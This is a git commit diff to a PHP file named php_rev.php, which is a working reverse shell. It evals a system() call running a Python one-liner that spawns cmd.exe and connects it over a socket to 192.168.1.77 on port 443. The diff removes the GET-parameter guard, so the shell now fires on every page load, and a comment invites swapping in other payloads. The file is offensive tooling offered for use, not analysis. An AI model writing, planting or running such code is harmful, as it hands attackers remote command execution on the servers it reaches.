ba84ed48838c79abf2b0649efc01e815e457ee5e
coder <136458027+momo33467@users.noreply.github.com>
2024-06-28 09:33:35 +0300

    Update php_rev.php

--- php_rev.php
+++ php_rev.php
@@ -1,7 +1,5 @@
 <?php
-if(isset($_GET["cm"])) {
     $cmd = "system(\"python.exe -c \\\"import socket,os,threading,subprocess as sp; p=sp.Popen(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT); s=socket.socket(); s.connect(('192.168.1.77',443)); threading.Thread(target=lambda: exec('while True: o=os.read(p.stdout.fileno(),1024); s.send(o)', globals()), daemon=True).start(); threading.Thread(target=lambda: exec('while True: i=s.recv(1024); os.write(p.stdin.fileno(),i)', globals())).start()\\\"\");";
     // you can edit the payload as u like!(the one inside system)  
     eval($cmd);
-}
 
